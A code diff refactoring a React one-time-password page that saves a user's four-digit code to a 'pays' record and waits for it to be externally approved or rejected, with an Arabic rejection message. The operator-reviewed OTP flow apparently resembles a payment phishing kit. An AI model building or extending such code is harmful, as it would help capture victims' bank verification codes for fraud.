@@ -15,9 +15,10 @@ import {
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner";
 import { StepShell } from "@/components/step-shell";
-import { db } from "@/lib/supabase-client";
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
+import { db, doc, onSnapshot, setDoc } from "@/lib/supabase-client";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 export default function FinalOtpPage() {
   const router = useRouter();
@@ -37,7 +38,7 @@ export default function FinalOtpPage() {
 
   // Init visitor
   useEffect(() => {
-    const id = localStorage.getItem("visitor") || "";
+    const id = getCookie("visitor") || "";
     if (!id) {
       router.push("/home-new");
       return;
@@ -52,7 +53,7 @@ export default function FinalOtpPage() {
     if (!visitorId || !db) return;
 
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorId),
+      doc("pays", visitorId),
       (snap) => {
         if (!snap.exists()) {
           router.push("/home-new");
@@ -72,7 +73,7 @@ export default function FinalOtpPage() {
           setError("");
           // Clear flag then redirect
           setDoc(
-            doc(db as Firestore, "pays", visitorId),
+            doc("pays", visitorId),
             { finalOtpStatus: "" },
             { merge: true },
           );
@@ -82,7 +83,7 @@ export default function FinalOtpPage() {
           setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.");
           setOtp(["", "", "", ""]);
           setDoc(
-            doc(db as Firestore, "pays", visitorId),
+            doc("pays", visitorId),
             { finalOtpStatus: "pending" },
             { merge: true },
           );
@@ -143,7 +144,7 @@ export default function FinalOtpPage() {
     setIsConfirming(true);
     try {
       await setDoc(
-        doc(db as Firestore, "pays", visitorId),
+        doc("pays", visitorId),
         { finalOtpStatus: "confirmed" },
         { merge: true },
       );
@@ -165,7 +166,7 @@ export default function FinalOtpPage() {
     try {
       setStatus("verifying");
       await setDoc(
-        doc(db as Firestore, "pays", visitorId),
+        doc("pays", visitorId),
         {
           finalOtp: code,
           finalOtpStatus: "verifying",
@@ -183,7 +184,7 @@ export default function FinalOtpPage() {
   const handleResend = async () => {
     if (!canResend || !db) return;
     await setDoc(
-      doc(db as Firestore, "pays", visitorId),
+      doc("pays", visitorId),
       { finalOtpResendAt: new Date().toISOString(), finalOtpStatus: "pending" },
       { merge: true },
     );
